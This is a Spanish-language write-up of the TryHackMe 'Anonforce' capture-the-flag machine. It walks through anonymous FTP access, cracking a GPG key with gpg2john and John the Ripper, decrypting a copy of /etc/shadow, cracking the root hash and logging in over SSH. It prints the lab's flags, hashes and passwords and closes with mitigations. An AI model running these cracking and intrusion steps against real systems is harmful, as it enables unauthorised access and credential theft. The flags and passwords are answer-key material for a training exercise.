# Anonforce - TryHackMe Write-up

## Descripción

Boot2root machine para FIT y Bsides Guatemala CTF.

**Dificultad:** Easy/Medium  
**Tags:** FTP Enumeration, GPG Cracking, Password Hash Cracking, SSH

---

## Enumeración Inicial

### Escaneo de puertos

```bash
nmap -p21,22 -sV 10.65.128.230
```

Resultado:
- **21/tcp** - FTP (vsftpd 3.0.3)
- **22/tcp** - SSH (OpenSSH 7.2p2)

---

## Fase 1: FTP Enumeration

### Conexión FTP anónima

```bash
ftp 10.65.128.230
# User: anonymous
# Password: anonymous
```

El servidor permite acceso anónimo con lectura completa del sistema de archivos.

### Obtención del user.txt

```bash
cd home/melodias
get user.txt
```

**USER FLAG:** `606083fd33beb1284fc51f411a706af8`

---

## Fase 2: Exploración de directorios

En el directorio raíz encontramos un directorio interesante: `/notread`

```bash
cd notread
ls -la
```

Archivos encontrados:
- `backup.pgp` (524 bytes)
- `private.asc` (3762 bytes)

---

## Fase 3: Cracking de clave GPG

### Extraer hash para John the Ripper

```bash
gpg2john private.asc > gpg_hash.txt
```

### Crackear password

```bash
john gpg_hash.txt --wordlist=/usr/share/wordlists/rockyou.txt
```

**Password GPG:** `xbox360`

### Importar clave privada

```bash
gpg --import private.asc
# Ingresar: xbox360
```

---

## Fase 4: Desencriptar backup

```bash
gpg --batch --yes --pinentry-mode loopback --passphrase "xbox360" --decrypt backup.pgp
```

Output contiene el archivo `/etc/shadow` con los siguientes usuarios:

```text
root:$6$07nYFaYf$F4VMaegmz7dKjsTukBLh6cP01iMmL7CiQDt1ycIm6a.bsOIBp0DwXVb9XI2EtULXJzBtaMZMNd2tV4uob5RVM0:18120:0:99999:7:::
melodias:$1$xDhc6S6G$IQHUW5ZtMkBQ5pUMjEQtL1:18120:0:99999:7:::
```

---

## Fase 5: Crackear hash de root

### Guardar hash

```bash
echo 'root:$6$07nYFaYf$F4VMaegmz7dKjsTukBLh6cP01iMmL7CiQDt1ycIm6a.bsOIBp0DwXVb9XI2EtULXJzBtaMZMNd2tV4uob5RVM0' > root_hash.txt
```

### Crackear (formato sha512crypt)

```bash
john root_hash.txt --format=sha512crypt --wordlist=/usr/share/wordlists/rockyou.txt
```

**Password Root:** `hikari`

---

## Fase 6: Acceso como root

### Conexión SSH

```bash
ssh root@10.65.128.230
# Password: hikari
```

### Obtención del root.txt

```bash
cat /root/root.txt
```

**ROOT FLAG:** `f706456440c7af4187810c31c6cebdce`

---

## Credenciales obtenidas

| Servicio | Usuario | Password |
|----------|---------|----------|
| FTP | anonymous | anonymous |
| GPG | anonforce | xbox360 |
| SSH | root | hikari |

---

## Flags

- **User.txt:** `606083fd33beb1284fc51f411a706af8`
- **Root.txt:** `f706456440c7af4187810c31c6cebdce`

---

## Técnicas utilizadas

1. **FTP Anonymous Access** - Acceso anónimo al servidor FTP
2. **Directory Traversal** - Navegación por el sistema de archivos
3. **GPG Key Cracking** - Extracción y cracking de clave privada PGP
4. **Shadow File Recovery** - Obtención de hashes de contraseñas
5. **SHA512Crypt Cracking** - Crackeo de hash de contraseña root
6. **SSH Privilege Escalation** - Acceso como root mediante SSH

---

## Mitigaciones

- Deshabilitar acceso anónimo FTP si no es necesario
- Usar claves GPG con frases de contraseña robustas
- Implementar políticas de contraseñas fuertes
- Deshabilitar acceso SSH con password (usar claves SSH)
- Limitar acceso FTP a directorios específicos (chroot)